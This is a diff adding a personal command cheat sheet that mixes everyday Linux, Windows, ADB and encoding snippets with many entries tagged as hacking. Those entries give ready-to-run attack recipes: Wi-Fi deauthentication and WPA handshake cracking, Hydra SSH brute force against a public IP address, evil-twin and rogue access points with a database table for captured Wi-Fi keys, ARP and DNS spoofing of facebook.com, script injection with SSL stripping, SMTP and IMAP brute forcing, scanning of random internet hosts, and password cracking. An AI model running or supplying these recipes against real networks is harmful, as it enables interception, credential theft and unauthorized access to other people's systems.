@@ -1,0 +1,1135 @@
+#windows
+$sdcard501
+*FORMAT SD CARD USING COMMAND PROMPT
+[open cmd administration]
+-diskpart
+-list disk
+-select disk 1
+-clean
+-create partition primary
+-select partition 1
+-format fs=fat32
+========================================
+
+#hacking
+$aircrack502
+*WIRELESS PENETRATION TEST
+-airmon-ng start wlan0
+-airodump-ng wlan0mon
+-airodump-ng --bssid 26:C6:A2:D8:9X:K3 -c1 -w File wlan0mon
+-aireplay-ng -0 4 -a 26:C6:A2:D8:9X:K3 wlan0mon
+-aircrack-ng File -w pass.txt
+========================================
+
+#hacking
+$hydra503
+*HYDRA SSH BRUTE FORCE
+-hydra -L u.txt -P p.txt ssh://192.168.2.127 -t4
+
+[OR]
+
+-hydra -L u.txt -P p.txt 45.79.49.74 ssh
+
+========================================
+
+#transferfiles
+$python504
+*HTTP FILE TRANSFER
+-python -m SimpleHTTPServer 8888
+-wget http://192.168.2.127:8888/download
+========================================
+
+#adb
+$adbc505
+*ADB CONNECTION
+-adb devices
+-adb shell
+IF YOU don't know ip
+-adb tcpip 5555
+If you know ip
+-adb connect 192.168.2.127:5555
+-adb shell
+========================================
+
+#hacking
+$evil506
+*EVIL TWIN
++https://null-byte.wonderhowto.com/how-to/hack-wi-fi-creating-evil-twin-wireless-access-point-eavesdrop-dwa-0147918/|For more info search this
+-airodump-ng --bssid 6E:D1:2F:L3 wlan0mon
+-airbase-ng -a 6E:D1:2F:L3 --essid "noooo" -c1 wlan0mon
+-airplay-ng -0 5 -a 6E:D1:2F:L3 wlan0mon
+These commands will help you to boost your network in evil twin
+-iw reg set BO
+-iwconfig wlan0 txpower 30
+
+========================================
+
+#wifi
+$wpa507
+*SETUP INTERFACE WLAN0 FILE (WIFI CONNECT AUTOMATICLY)
+-vi /etc/network/interfaces
+paste this
+auto wlan0
+iface wlan0 inet dhcp
+wpa-conf /etc/wpa_supplicant/wpa_supplicant.conf
+========================================
+
+#wifi
+$wpasup508
+*TO SET WPA SUPPLICANT FILE
+-wpa_passphrase your_wifi_name >> /etc/wpa_supplicant/wpa_supplicant.conf
+enter password
+-wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf
+========================================
+
+#os
+$resp509
+*SETUP SSH IN HEADLESS RASPBERRY PI
++https://pastebin.com/sSE3ZyuN|check this link for this type of info
+-cd /boot
+-create ssh
+-vi ssh
+-Esc :x
+========================================
+
+#hacking
+$monitor510
+*ADD NEW INTERFACE IN WIRELESS NETWORK IN MONITOR MODE
+-iw phy phy0 interface add mon0 type monitor
+-iwconfig
+-ifconfig mon0 up
+========================================
+
+#hacking
+$airmon511
+*ADD NEW INTERFACE IN WIRELESS NETWORK WITH AIRMON-NG
+-airmon-ng start wlan0
+-iwconfig
+-ifconfig mon0 up
+-airmon-ng stop wlan0
+This can destroy your interface
+-airmon-ng start wlan0 11
+This can start your interface with different channel
+========================================
+
+#find
+$locate512
+*HOW TO FIND ANY FILE IN LINUX? USE THIS COMMAND
+-locate filename
+========================================
+
+#net
+$proxy513
+*HIDE YOUR SELF WITH PROXY CHAINING
+-vi /etc/proxychains.conf
+first remove Dynamic_Chain #
+second Disabled strict_chain with #
+third remove proxy_dns #
+fourth Disabled socks4 127.0.0.1 9050 #
+fifth add your servers -> socks4 IP PORT
+For example: socks4 125.26.99.228 44052
+http 3.236.52.219 8888
+-proxychains firefox google.com
+-proxychains nmap google.com
+spys.one/en/ You can find free proxy with this website
+you can add unlimited servers in proxychains
+========================================
+
+#hacking
+$hashcat514
+*CRACK SSH PASSWORD USING HASH CAT
+-hashcat -a0 -m 1800 -o cracked_passwd.txt \
+hashes.txt wordlist.txt
+Now first we want a ssh passwd hash code then you can make a hash list then make a passwd list then use this command
+========================================
+
+#hacking
+$bettercap515
+*BETTERCAP FOR WIFI ATTACK
+-bettercap --iface mon0
+-wifi.recon on
+-events.ignore wifi.ap.new
+-wifi.show
+-set net.sniff.output handshakes.pcap
+-net.sniff on
+-events.ignore net.sniff.802.11
+If you want to show specific channel SSID then
+-wifi.recon.channel 1
+-wifi.show
+-wifi.deauth 02:26:75:FE
+For DOS Attack
+-aircrack-ng handshakes.pcap -w pass.txt
+========================================
+
+#hacking
+$mon2516
+*3 WAYS TO SET YOUR INTERFACE TO MONITOR MODE
+-ip link set wlan0 down
+-iw wlan0 set monitor none
+-ip link set wlan0 up
+[method 2]
+-ifconfig wlan0 down
+-iwconfig wlan0 mode monitor
+-ifconfig wlan0 up
+[method 3]
+-airmon-ng start wlan0
+========================================
+
+#encryption
+$md5517
+*CONVERT SIMPLE TEXT TO MD5 OR SHA ENCRYPTIONS
+-echo -n "hi" | md5sum
+-echo -n "hi" | shasum
+-echo -n "hi" | sha512sum
+-echo -n "hi" | sha256sum
+[Decode MD5]
+-hashcat -m0 -a0 hash.txt pass.txt
+========================================
+
+#user
+$chname518
+*CHANGE USERNAME AND PASSWD
+-cat /etc/passwd | grep kali
+-usermod -l Aro kali
+[NEW NAME = ARO/ OLD NAME = KALI]
+-usermod -u 1234 Aro
+========================================
+
+#user
+$adduser519
+*ADD NEW USER IN LINUX
+[method 1]
+-useradd Aro
+-su Aro
+[method 2]
+-sudo adduser Aro
+-usermod -aG sudo Aro
+========================================
+
+#user
+$deluser520
+*DELETE OLD USER IN LINUX
+[method 1]
+-userdel kali
+[method 2]
+-deluser kali
+========================================
+
+#windows
+$intresting-cmd521
+*CMD INTERESTING COMMANDS
+prompt = It is used to change name
+for ex: 
+-prompt root@Aro
+title = It is used to change title
+for ex: 
+-title my pc
+
+-Attrib +h +s +r harry 
+It is hide your files.
+-Attrib -h -s -r harry 
+It is unhide your files.
+-ipconfig | clip 
+It is copy your command output.
+Then you can paste this in notepad
+-Press F7 
+It show command history
+-md com\ 
+It create new folder
+-wmic product get name 
+It show all your installed app names in windows.
+search "Turn windows features on or off" then enable telnet then It can show all apps name
+========================================
+
+#scan
+$nmap522
+*NMAP
+-nmap -sn google.com
+FIND LIVE HOSTS IN YOUR NETWORKS
+
+-nmap scanme.nmap.org
+LISTING OPEN PORTS ON A TARGET HOST
+
+-nmap -sV scanme.nmap.org
+FINGERPRINTING OS AND SERVICES RUNNING ON TARGET HOST
+
+-nmap -O scanme.nmap.org
+TO ENABLE OS DETECTION
+
+-nmap -sC scanme.nmap.org
+USE NSE SCRIPTS AGAINST A TARGET HOST
+
+-nmap --exclude-file dontscan.txt 192.168.1.1/24
+EXCLUDING A HOST LIST FROM YOUR SCANS
+
+-nmap -p25,80 -O -T4 192.168.1.1/24
+SCANNING AN IP ADDRESS RANGES
+
+-nmap -iR 100
+SCANNING RANDOM TARGET ON THE INTERNET
+
+-nmap -p80,443 -Pn -T4 --open --script http-headers,http-title,ssl-cert google.com
+COLLECTING SIGNATURES OF WEB SERVERS
+
+-nmap -6 nmap.org
+SCANNING IPV6 ADDRESS
+
+-nmap --script broadcast -e wlan0
+GATHERING NETWORK INFORMATION WITH BROADCAST SCRIPTS
+
+-nmap -sV -Pn -n --proxies socks4://127.0.0.1:9050 scanme.nmap.org
+SCANNING THROUGH PROXIES
+
+-nmap -p80 --script ipidseq -iR 1000
+SPOOFING THE ORIGIN IP OF A SCAN
+
+-nmap -sn -PS 192.1.1/24
+DISCOVERING HOSTS WITH TCP SYN PING SCANS
+
+-nmap -sn -PA 192.1.0.1/24
+DISCOVERING HOSTS WITH TCP ACK PING SCAN
+
+-nmap -sn -PA21,22,80 google.com
+PRIVILEGED VERSUS UNPRIVILEGED TCP ACK PING SCAN
+
+-nmap -sn -PU scanme.nmap.org
+DISCOVERING HOSTS WITH UDP PING
+
+-nmap -sn -PU1337,11111 scanme.nmap.org
+-nmap -sn -PU1337 scanme.org
+-nmap -sn -PU1337,1339 nmap.org
+SELECTING PORTS IN UDP PING SCANS
+
+-nmap -sn --script ip-geolocation-* google.com
+PERFORMING IP ADDRESS GEOLOCATION
+
+-nmap -sn --script whois-* google.com
+GETTING INFORMATION FROM WHOIS RECORDS
+
+-nmap --traceroute --script traceroute-geolocation google.com
+OBTAINING TRACEROUTE GEOLOCATION INFORMATION
+
+-nmap -sn -Pn -n --script shodan-api --script-args shodan-api.apikey=(shodanAPI-key) scanme.nmap.org
+QUERYING SHODAN TO OBTAIN TARGET INFORMATION
+
+-nmap -p80 --script http-google-malware --script-args http-google-malware.api=<API> <Target>
+CHECKING WHETHER A HOST IS FLAGGED BY GOOGLE SAFE BROWSING FOR MALICIOUS ACTIVITIES
+
+-nmap -p(port) --script http-grep google.com
+COLLECTING VALID E-MAIL ACCOUNTS AND IP ADDRESS FROM WEB SERVERS
+
+-nmap -sn --script hostmap-* example.com
+DISCOVERING HOSTNAMES POINTING TO THE SAME IP ADDRESS
+
+-nmap --script dns-brute example.com
+DISCOVERING HOSTNAMES BY BRUTE FORCING DNS RECORDS
+
+-nmap -sn --script google-people-enum --script-args='username=(username),password=(passwd),userdb=U'
+OBTAINING PROFILE INFORMATION FROM GOOGLE'S PEOPLE API
+
+-nmap -sV --script vulscan example.com
+MATCHING SERVICES WITH PUBLIC VULNERABILITY ADVISARIES
+
+-nmap -p80 --script http-unsafe-output-escaping exp.com
+DETECTING XSS VULNERABILITIES
+
+-nmap -p80 --script http-sql-injection exp.com
+FINDING SQL INJECTION VULN
+
+-nmap -p80 --script http-slowloris --max-parallelism 400 exp.com
+DETECTING WEB SERVERS VULNERABLE TO SLOWLORIS DENIAL OF SERVICE ATK
+
+-nmap -p80 --script http-default-accounts exp.com
+FINDING WEB APPLICATIONS WITH DEFAULT CREDENTIALS
+
+-nmap -sV --script http-shellshock exp.com
+DETECTING WEB APPLICATIONS VULNERABLE TO SHELLSHOCK
+
+-nmap -sV --script smtp-open-relay -V exp.com
+DETECTING SMTP OPEN RELAYS
+
+-nmap -p25 --script smtp-brute exp.com
+BRUTE FORCING SMTP PASSWD
+
+-nmap -sV --script smtp-strangeport exp.com
+DETECTING SUSPICIOUS SMTP SERVERS
+
+-nmap -p25 --script smtp-enum-users exp.com
+ENUMERATING SMTP USERNAMES
+
+-nmap -p143 --script imap-brute exp.com
+BRUTE FORCING IMAP PASSWD
+
+-nmap --source-port (PORT) (Target-IP)
+MANUALLY SPECIFY A SOURCE PORT
+
+-nmap --data-length (size) (Target-IP)
+APPEND RANDOM DATA
+
+-nmap --randomize-hosts (T-IP)
+RANDOMIZE TARGET SCAN ORDERS
+
+-nmap --spoof-mac (MAC/0/vendor) (T-IP)
+SPOOF MAC ADDRESS
+
+-nmap --badsum (T-IP)
+SEND BAD CHECKSUM
+
+-cpan -i shell
+-apt install pbnj
+-scanpbnj -a (Nmap argument) (T-IP)
+SAVING SCAN RESULT TO SQLITE DATA BASE
+
+-nmap -oG (output file) (T-ip)
+SAVING SCAN RESULTS IN A GREPABLE FORMAT
+
+-nmap -sV -traceroute exp.com
+GENERATING A NETWORK TOPOLOGY GRAPH WITH ZENMAP
+
+-nmap -A -oX results.xml exp.com
+-xsltproc results.xml -o results.html
+GENERATING HTML SCAN REPORTS
+
+-nmap -sV --script vuln (T-IP)
+REPORTING VULN CHECKS
+========================================
+
+#theory
+$mmi523
+*MMI CODES
+DISPLAY INFORMATION ABOUT PHONE
+-*#*#4636#*#*
+
+Call forwarding
+-*401* (phone number)
+
+Deactivate call forwarding
+-*402
+========================================
+
+#hacking
+$spoofing524
+*DNS SPOOFING
+-vi /etc/ettercap/etter.conf
+go "linux" text then remove both # iptables
+-service apache2 start
+-vi /etc/ettercap/etter.dns
+go to microsoft.com section and enter facebook.com and then paste your DNS test ip
+for ex: faceboook.com A 192.168.1.6 -> This IP is your Apache server IP
+*.faceboook.com A 192.168.1.6
+-ettercap -T -S -i wlan0 -M arp:remote -P dns_spoof /192.168.1.7// /192.168.1.1//
+Target = 192.186.1.7 =>  Default gateway = 192.168.1.1
+========================================
+
+#web
+$localhost525
+*CREATE YOUR LOCAL HOST PAGE
+-cd /var/www/html/
+-rm index.html
+-echo you have been hacked > index.html
+-service apache2 start
+Enter your ip in google now
+========================================
+
+#hacking
+$betterspoof526
+*DNS SPOOFING WITH BETTERCAP
+-bettercap --iface wlan0
+-net.probe on
+-set arp.spoof.fullduplex true
+-set arp.spoof.targets 192.168.241.199
+if you want to show who is connected to your wifi) [net.show] in bettercap
+-arp.spoof on
+-set net.sniff.local true
+-net.sniff on
+-set dns.spoof.all true
+-set dns.spoof.domains facebook.com
+-dns.spoof on
+========================================
+
+#hacking
+$mitmfspoof527
+*DNS SPOOF WITH MITMF
+-vi /etc/mitmf/mitmf.conf
+change domain name and ip
+-mitmf --arp --spoof --gateway 192.168.1.1 --target 192.168.1.75 -i wlan0 --dns
+========================================
+
+#hacking
+$inject528
+*INJECT SCRIPTS AND REDIRECT WITH BETTERCAP
+TIP => use in your apache server
+-net.probe on
+-net.recon on
+-arp.spoof on
+-help http.proxy
+-set http.proxy.injectjs /script.js
+-set http.proxy.sslstrip true
+-http.proxy on
+-net.sniff on
+========================================
+
+#hacking
+$eviltwin529
+*PROPER WAY TO USE EVIL TWIN BY NETWORK CHECK
+You can use any one for create network: airbase-ng OR hostapd I am using HOSTAPD
+-apt install hostapd
+-vi /etc/hostapd/hostapd.conf
+-udhcpd -f
+It gives users to ip
+-dnschef --nameserver=192.168.0.2/24 --fakeip=192.168.1.1 --interface=192.168.1.1 --fakedomains=google.com,*.ikea.com,*.amazon.com
+-service hostapd start
+========================================
+
+#hacking
+$eviltwinz530
+*EVIL TWIN BY ZSECURITY
+-apt install hostapd dnsmasq apache2
+-vi hostapd.conf
+interface=mon0
+driver=nl80211
+ssid=Master
+hw_mode=g
+channel=8
+macaddr_acl=0
+ignore_broadcast_ssid=0
+[it create fake network]
+-vi dnsmasq.conf
+interface=mon0
+dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
+dhcp-option=3,192.168.1.1
+dhcp-option=6,192.168.1.1
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=127.0.0.1]
+
+-ifconfig mon0 up 192.168.1.1 netmask 255.255.255.0
+-route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+-iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+-iptables --append FORWARD --in-interface mon0 -j ACCEPT
+-echo 1 > /proc/sys/net/ipv4/ip_forward
+-sudo apt install mariadb-server
+-service mysql start
+-mysql
+-create database fap;
+-create user fapuser;
+-grant all on rogueap.* to 'fapuser'@'localhost' identified by 'fappassword';
+-use fap;
+-create table wpa_keys(password1 varchar(40), pass2 varchar(40));
+-Alter Database fap character set 'utf8';
+-select * from wpa-keys;
+-service apache2 start
+-hostapd hostapd.conf
+-dnsmasq -C dnsmasq -d
+-dnsspoof -i mon0
+========================================
+
+#net
+$tcpdump531
+*TCPDUMP
+-tcpdump -D
+show all network cards
+-tcpdump -i eth0
+-tcpdump -i any
+It select all interfaces and show all links
+-tcpdump -n -i any
+It show traffic + ports
+-tcpdump -i any dst port 80
+It only show 80 port traffic
+OR
+-tcpdump -i any port 80
+-tcpdump -i ppp0 -vv ip6
+It use for vpn device show ip
+-tcpdump -i any host 192.168.1.31 and not src net 192.168.1.0/24
+It show only 192.168.2.82 traffic
+-tcpdump -i any -s 65535 -w capturefile.cap
+65535=file size
+It download the capture file
+========================================
+
+#net
+$capture532
+*HOW TO CAPTURE NETWORK FILE WITH SSH
+-ssh root@192.168.1.1 -- "tcpdump -w - -s 65535 'not port 22'"
+capture.pcap
+========================================
+
+#net
+$php533
+*START SERVER WITH PHP
+-php -s localhost:8080 index.php
+========================================
+
+#net
+$python534
+*START SERVER WITH PYTHON
+-python -m http.server 8000
+========================================
+
+#steg
+$cat535
+*HIDE ANY SECRIT FILE IN A IMAGE
+-cat A.jpg secretfile > B.jpg
+Real name jpg + your file.zip -> new jpg name
+Extract that file: 
+-unzip B.jpg
+========================================
+
+#web
+$localworld536
+*USE YOUR LOCAL HOST ALL OVER THE WORLD USING SSH (FIRST METHOD)
+-ssh-keygen
+[Just type enter enter don't type anything]
+-service apache2 start
+-ssh -R 80:localhost:80 localhost.run
+========================================
+
+#web
+$localworld2537
+*USE YOUR LOCAL HOST, WORLD WIDE HTTPS INCLUDED (METHOD 2)
+-apt install npm
+-npm install -g localtunnel
+-service apache2 start
+-lt --port 80
+========================================
+
+#net
+$tmate538
+*SHARE YOUR SCREEN TO ANYONE IN THE WORLD
+-apt install tmate
+-tmate
+copy ssh command and paste in putty
+
+you can also use
+-tmate show-message
+then copy link and paste in browser
+========================================
+
+#transferfiles
+$scp539
+*TRANSFER FILE WITH SSH ANOTHER EXAMPLE
+-scp A.txt B.txt root@192.168.1.1:/root
+========================================
+
+#transferfiles
+$nc540
+*TRANSFER FILE WITH NETCAT
+sender:
+-nc -lvp 1337 < A.txt
+receiver:
+-nc 192.168.1.1 1337 | pv -b > A.txt
+========================================
+
+#hacking
+$metasploitpro541
+*USE METASPLOIT LIKE A PRO
+so first we can scan target device with nmap
+then if some port is open then we can search in metasploit
+-search vsftpd <= Example
+-then show options and exploit
+sessions = (some) command is we can enter our device any time for ex: we can open a session in android and windows then after use we can close our computer then after we can open again.
+-sessions -i 1 
+choose your session or number
+you can search more precisely in metasploit
+-grep scanner search smb
+-grep exploit search smb
+If you don't know which payload I can enter with this exploit then type set payload and double tab key.
+If you want some file in target computer then type: 
+-migrate 4020 
+4040= File number
+========================================
+
+#steg
+$steghide542
+*HIDE FILE INSIDE IMAGE USING STEGHIDE
+-apt install steghide
+-steghide --embed -ef m.txt -cf old.jpg -sf New.jpg -p 123456
+This will hide your text message in image
+-steghide --info New.jpg
+This will give info about image
+-steghide --extract -sf New.jpg
+This will extract Txt in your image
+========================================
+
+#hacking
+$gobuster543
+*GOBUSTER
+It is use for find a website URLs like if you choose facebook.com:
+facebook.com/admin
+facebook.com/images
+-gobuster dir -u https://www.facebodc.com/ -w /usr/share/wordlists/metasploit/http_default_users.txt
+========================================
+
+#zip
+$zipc544
+*CREATE ZIP FILE
+-zip rev.zip rev.zip
+USE -e FOR PASSWD PROTECTED ZIP FILE
+-zip -e p.zip L.jpg
+========================================
+
+#find
+$which545
+*WHICH COMMAND
+use which command to find is this pkg or apt installed in this computer or not
+Ex:
+-which python
+========================================
+
+#fancy
+$figlet546
+*MAKE YOUR BANNER IN TERMINAL USING FIGLET
+-figlet -f mono12
+========================================
+
+#hacking
+$crackfile547
+*CRACK PASSWD PROTECTED FILE WITH ZYDRA
+git clone this tool first
+You can download your wordlist using this link:
++https://github.com/danielmiessler/SecLists/blob/master/Passwords/
+-python3 zydra.py -f A.jpg -d word.txt
+If you want to use in a advance way then
+-python3 zydra.py -f A.jpg -b letters,digits -m 1 -x 6
+-b = is use for letters upper case or lower case
+-m = is use for number of digits in passwd
+-x = is use for how passwd is long like 7 words 6 words.
+========================================
+
+#theory
+$notepad548
+*USE YOUR CHROME AS A NOTEPAD
+-data:text/html,<html contenteditable>
+========================================
+
+#cli_tool
+$eom549
+*OPEN IMAFES USING CLI CMD
+
+-xdg-open A.JPG
+-eog A.JPG
+-eom a.jpg
+========================================
+
+#encryption
+$base64550
+*HOW TO ENCODE AND DECODE ANY TEXT IN LINUX BASE64
+for text
+-echo -n "Hello" | base64
+for file
+-base64 Hi.txt
+
+DECODE
+-echo -n "xFO24=" | base64 -d -i
+-base64 --decode Hi.txt
+========================================
+
+#scan
+$ipscan551
+*IP SCANNER TOOL USING PYTHON
+import netifaces as ni
+ni.ifaddresses('eth0')
+ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+print(ip)
+========================================
+
+#hacking
+$pass552
+*PASS GENERATOR TOOL USING PYTHON
+import random
+lower = "abcdefghijklmnopqrstuvwxyz"
+upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+numbers = "0123456789"
+sym = "[](){}*;:%,"
+all = upper + lower + numbers + sym
+length = 16
+pass = "".join(random.sample(all, length))
+print(pass)
+========================================
+
+#net
+$tor553
+*ANONYMOUS ON INTERNET
+Download Nipe.pl (Github)
+-apt install tor
+-sudo cpan install Try::Tiny config::Simple JSON
+-perl Nipe.pl install
+-perl Nipe.pl start
+========================================
+
+#zip
+$gzip554
+*COMPRESS ANY FILE WITH GZIP
+for compress
+-gzip file
+for Decompress
+-gzip -d file.gz
+OR
+-gunzip file.gz
+========================================
+
+#info
+$nslookup555
+*WEB INFO GATHERING CMDS
+-whois domain
+whois info for domain
+-nslookup domain
+same working
+-dig domain
+DNS info for domain
+========================================
+
+#windows
+$sfc556
+*SCAN YOUR WINDOW IN CMD
+-sfc /scannow
+========================================
+
+#windows
+$netsh557
+*SHOW WIFI PSSWD IN WINDOWS
+-netsh wlan show profiles
+-netsh wlan show profiles "Name" key=clear
+========================================
+
+#encryption
+$binary558
+*TYPE OF ENCRYPTION WITH DECRYPTION - BINARY
+[Enc cmd:] 
+-echo Hello | xxd -b
+[DEC using Python:]
+a = '01101100 110110 00101'
+"".join([chr(int(i,2)) for i in a.split(' ')])
+========================================
+
+#encryption
+$base32559
+*BASE32
+[ENC CMD]
+-echo "hi" |base32 
+[DEC:] 
+-echo "MJQxGZTGIQGS4ZAON2XAZL====" | base32 -d
+========================================
+
+#encryption
+$base64560
+*BASE64
+[ENC:]
+-echo "hi" |base64 
+[DEC:] 
+-echo "RWFjaCBCYXN1NjQgZQZGlmaQF" | base64 -d
+========================================
+
+#encryption
+$hex561
+*HEX
+[Enc cmd] 
+-echo -m "HELO" | od -A m -t x1 OR echo hi | xxd
+[DEC using python:]
+python -c "print(bytearray.fromhex('68657861646563696d61').decode())"
+[using bash:]
+echo "68 65 78 61 64 65 63 69 6d 61" | xxd -r -p
+========================================
+
+#encryption
+$rot13562
+*ROT13
+[ENC:]
+-echo 'Hello' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+[DEC:] 
+-echo "Ebgngx zr 13 cympxf!" | tr 'A-Za-z' 'N-ZA-Mm-za-m'
+========================================
+
+#encryption
+$rot47563
+*ROT47
+
+[ENC:]
+-echo 'Hello World!' | tr '\!-~' 'P-~\!-O'
+
+[DEC:]
+-echo "*@F DA:? >6 C:89E?5 323J C:82E" | tr '\!-~' 'P-~\!-O'
+========================================
+
+#encryption
+$morse564
+*MORSE
+[ENC:]
+-python3 -c 'm={}; a="ABCDEFGHIJKLMNOPQRSTUVWXYZ"; c=[".-","-...","-.-.","-..",".","..-.","--.","....","..",".---","-.-",".-..","--","-.","---",".--.","--.-",".-.","...","-","..-","...-",".--","-..-","-.--","--.."]; m=dict(zip(a,c)); s=input("Message: ").upper(); print(" ".join(m.get(x,"/") if x!=" " else "/" for x in s))'
+[DEC:]
+-python3 -c 'm={}; a="ABCDEFGHIJKLMNOPQRSTUVWXYZ"; c=[".-","-...","-.-.","-..",".","..-.","--.","....","..",".---","-.-",".-..","--","-.","---",".--.","--.-",".-.","...","-","..-","...-",".--","-..-","-.--","--.."]; m=dict(zip(c,a)); s=input("Morse: "); print("".join(m.get(x,"?") if x!="/" else " " for x in s.split()))'
+========================================
+
+#encryption
+$ascii565
+*ASCII
+[ENC:]
+-echo -n "Hello" | od -An -t u1
+or
+-python3 -c 'print(" ".join(map(str,b"Hello")))'
+[DEC:]
+-python3 -c 'print("".join(chr(int(x)) for x in "72 101 108 108 111".split()))'
+========================================
+
+#net
+$nmp566
+*START YOUR SERVER WITH NPM
+-apt install npm
+-npm install http-server
+-http-server -p 8080
+========================================
+
+#cli_tool
+$column567
+*LIST SHOW IN COLUMNS FORM
+show list more perfectly
+-ls -lt | column -t
+========================================
+
+#encryption
+$hashe568
+*HASHES ENCRYPTION USING PYTHON
+%hash.py
+========================================
+
+#encryption
+$hashd569
+*DECRYPT HASH USING PYTHON
+%hash_decode.py
+========================================
+
+#info
+$dmitry570
+*DMITRY
+it is a recon tool
+-apt install dmitry
+-dmitry -oiwnsep google.com
+========================================
+
+#info
+$strings571
+*GATHER SOME INFO ABOUT FILES
+-file a.ab
+-strings t.txt
+========================================
+
+#convert
+$xml572
+*CONVERT ANY FILE TO XML
+-plistutil -i c.plist -o c.xml
+========================================
+
+#encryption
+$aes573
+*AES 128 AND 256 ENCRYPTION DECRYPT AND ENCRYPT USING CLI
+ENC: 
+-echo Hi | openssl aes-128-cbc -a -salt -k passwd
+DEC: 
+-echo E42Bla52bla | openssl aes-128-cbc -a -d -salt -k passwd
+========================================
+
+#encryption
+$aes256574
+*AES 256 ENCRYPTION DECRYPT AND ENCRYPT FOR FILE
+ENC: 
+-openssl enc -aes-256-cbc -a -e -in t.py -out t.py.enc -pbkdf2 -iter 1000000 -md sha512
+DEC: 
+-openssl enc -aes-256-cbc -a -d -in t.py.enc -out t.py -pbkdf2 -iter 1000000 -md sha512
+========================================
+
+#info
+$git575
+*GIT SHOW
+This command show details on git objects such as blobs, trees, tags and comments
+for ex: cd master/.git/logs
+-git show HEAD
+========================================
+
+#hacking
+$usbrip576
+*USBRIP
+-sudo -H python3 -m pip install usbrip
+it is a simple forensic tool with command line it track USB devices.
+-usbrip events violations
+========================================
+
+#convert
+$doc577
+*CONVERT .DOC FILE TO PLAIN TEXT
+-abiword --to=txt my.doc
+
+========================================
+
+#hacking
+$john578
+*HOW TO BRUTE FORCE ENCRYPTED LOCKED FILES WITH JOHN AND HASHCAT
+first install office2John.py file
+-wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/office2john.py
+now create your enc file to hash
+-python office2john.py book.xlsx > hash.txt
+now this will convert your file into hash
+
+[John method to crack:]
+-john --wordlist=100000.txt hash.txt
+-john --show hash.txt
+
+[Hash cat method to crack:]
+-hashcat -a0 -m 9400 --username -o cracked_pass.txt hash.txt 100000.txt
+-cat cracked_pass.txt
+========================================
+
+#adb
+$adbkey579
+*TYPE ANY THING IN ANDROID WITHOUT TOUCHING IT
+-adb shell "input keyboard text 'Hello Hi'"
+========================================
+
+#adb
+$adbtype580
+*ADB TYPE WITH KEY EVENTS
+-adb shell input keyevent 26
+[some possible values for event-code are:]
+0 = keycode_unknown
+1 = keycode_menu
+2 = soft_right
+3 = home
+4 = back
+5 = call
+6 = endcall
+7 = 0
+8 = 1
+9 = 2
+10 = 3
+11 = 4
+12 = 5
+13 = 6
+14 = 7
+15 = 8
+16 = 9
+17 = star
+18 = pound
+19 = dpad_up
+20 = dpad_down
+21 = dpad_left
+22 = dpad_right
+23 = dpad_center
+24 = volume_up
+25 = volume_down
+26 = power
+27 = camera
+28 = clear
+29 = a
+30 = b
+31 = c
+32 = d
+33 = e
+34 = f
+35 = g
+36 = h
+37 = i
+38 = j
+39 = k
+40 = l
+41 = m
+42 = n
+43 = o
+44 = p
+45 = q
+46 = r
+47 = s
+48 = t
+49 = u
+50 = v
+51 = w
+52 = x
+53 = y
+54 = z
+55 = comma
+56 = period
+57 = alt_left
+58 = alt_right
+59 = shift_left
+60 = shift_right
+61 = tab
+62 = space
+63 = sym
+64 = explorer
+65 = envelope
+66 = enter
+67 = del
+68 = grave
+69 = minus
+70 = equals
+71 = left_bracket
+72 = right_bracket
+73 = backslash
+74 = semicolon
+75 = apostrophe
+76 = slash
+77 = at
+78 = num
+79 = headsethook
+80 = focus
+81 = plus
+82 = menu
+83 = notification
+84 = search
+========================================
+
+#adb
+$internal581
+*COPY INTERNAL STORAGE USING ADB
+-adb pull /sdcard
+========================================
+
+#adb
+$backup582
+*CREATE BACKUP FILE WITH ADB
+-adb backup -apk -shared -all -f backup.ab
+========================================
+
+#fancy
+$banner583
+*CREATE ANY IMAGE INTO YOUR LINUX BANNER
+-jp2a --border --colors --color-depth=24 --html-fill -x your.jpg
+========================================
+
+#c
+$gcc584
+*HOW TO RUN C FILE IN LINUX
+-gcc A.c -o A
+-./A
+========================================
+
+#find
+$grep585
+*GREP MULTIPLE WORDS
+-grep 'w1\|w2' f_name
+OR
+-cat f.txt | grep 'w1\|w2'
+OR
+-grep -e w1 -e w2 -e w3 f.txt
+OR
+-grep -E 'w1|w2|w3' f.txt
+OR
+-egrep 'w1|w2|w3' f.txt
+========================================
+
+#find
+$grepcount586
+*COUNT A PARTICULAR WORD WITH GREP
+-cat f.txt | grep -c a
+========================================
+
+#cli_tool
+$count587
+*COUNT LINES IN A FILE
+-wc -l f.txt
+========================================
+
+#net
+$publicip588
+*HOW TO SEE PUBLIC IP
+-echo $(wget -qO- https://api.ipify.org)
+
